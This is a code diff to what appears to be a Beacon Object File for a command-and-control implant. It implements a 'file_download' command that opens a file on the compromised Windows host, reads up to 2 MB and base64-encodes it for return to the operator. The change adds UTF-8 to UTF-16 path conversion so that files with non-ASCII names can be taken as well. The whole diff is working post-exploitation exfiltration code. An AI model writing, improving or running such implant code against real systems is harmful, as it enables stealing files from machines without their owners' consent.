@@ -20,7 +20,7 @@
 #include <windows.h>
 #include "beacon.h"
 
-DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
+DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
     DWORD, DWORD, HANDLE);
 DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE);
@@ -28,7 +28,10 @@ DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
 DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
 DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
 DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
+DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);
 DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);
+
+#define CP_UTF8_ 65001
 
 #define MAX_FILE  (2 * 1024 * 1024)   /* 2 MB cap */
 static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
@@ -96,7 +99,13 @@ void go(char *args, int alen) {
     while (plen > 0 && (path[plen-1] == '\r' || path[plen-1] == '\n')) path[--plen] = 0;
     if (plen <= 0) { BeaconPrintf(CALLBACK_ERROR, "file_download: no path specified"); return; }
 
-    HANDLE h = KERNEL32$CreateFileA(path, 0x80000000 /*GENERIC_READ*/, 1 /*FILE_SHARE_READ*/,
+    /* Convert the UTF-8 path to UTF-16 so non-ASCII (Chinese, etc.) paths open
+     * correctly. CreateFileA would mis-decode the bytes as the system ACP. */
+    wchar_t wpath[MAX_PATH];
+    int wl = KERNEL32$MultiByteToWideChar(CP_UTF8_, 0, path, -1, wpath, MAX_PATH);
+    if (wl <= 0) { BeaconPrintf(CALLBACK_ERROR, "file_download: bad path encoding"); return; }
+
+    HANDLE h = KERNEL32$CreateFileW(wpath, 0x80000000 /*GENERIC_READ*/, 1 /*FILE_SHARE_READ*/,
         NULL, 3 /*OPEN_EXISTING*/, 0x80 /*FILE_ATTRIBUTE_NORMAL*/, NULL);
     if (h == INVALID_HANDLE_VALUE) {
         BeaconPrintf(CALLBACK_ERROR, "file_download: cannot open %s (%lu)", path, KERNEL32$GetLastError());
